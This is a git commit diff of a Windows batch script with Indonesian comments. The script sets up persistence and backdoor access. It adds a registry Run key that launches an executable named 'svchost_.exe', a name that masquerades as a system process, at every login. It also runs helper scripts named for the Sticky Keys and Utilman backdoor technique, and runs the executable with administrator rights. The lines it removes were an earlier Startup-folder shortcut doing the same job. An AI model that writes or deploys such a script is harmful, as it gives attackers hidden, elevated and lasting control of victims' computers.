87e59dd2483616d4ed6d4e9c45bb2fdeefb3ce2e
FooTex16 <hffjhfcvvtugs@yahoo.com>
2025-07-05 06:26:19 +0700

    RunScript.bat

--- RunScript.bat
+++ RunScript.bat
@@ -1,21 +1,19 @@
 @echo off
-:: Menjalankan batch dan exe dengan hak administrator dari folder yang sama
+:: ---------------------------
+:: Tambahkan svchost_.exe ke startup registry (user login)
+:: ---------------------------
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v XMASTERTES /t REG_SZ /d "C:\ProgramData\AppData\XMASTERTES-main\svchost_.exe" /f
+
+:: ---------------------------
+:: Jalankan file BAT dan EXE dengan hak administrator
+:: ---------------------------
 set "currentDir=%~dp0"
 
-:: Jalankan script sebagai Administrator
+:: Jalankan ExecuteStickyKeys.bat
 powershell -Command "Start-Process '%currentDir%ExecuteStickyKeys.bat' -Verb RunAs"
+
+:: Jalankan ExecuteUtilman.bat
 powershell -Command "Start-Process '%currentDir%ExecuteUtilman.bat' -Verb RunAs"
+
+:: Jalankan svchost_.exe
 powershell -Command "Start-Process '%currentDir%svchost_.exe' -Verb RunAs"
-
-:: Menambahkan svchost_.exe ke folder Startup
-:: Target: C:\Users\FooTex16\Desktop\XHAMSTER\svchost_.exe
-set "targetExe=C:\Users\FooTex16\Desktop\XHAMSTER\svchost_.exe"
-set "shortcutName=SystemHost.lnk"
-set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-
-:: Buat shortcut menggunakan PowerShell
-powershell -Command ^
-  "$s=(New-Object -COM WScript.Shell).CreateShortcut('%startupFolder%\%shortcutName%'); ^
-   $s.TargetPath='%targetExe%'; ^
-   $s.WorkingDirectory='C:\Users\FooTex16\Desktop\XHAMSTER'; ^
-   $s.Save()"
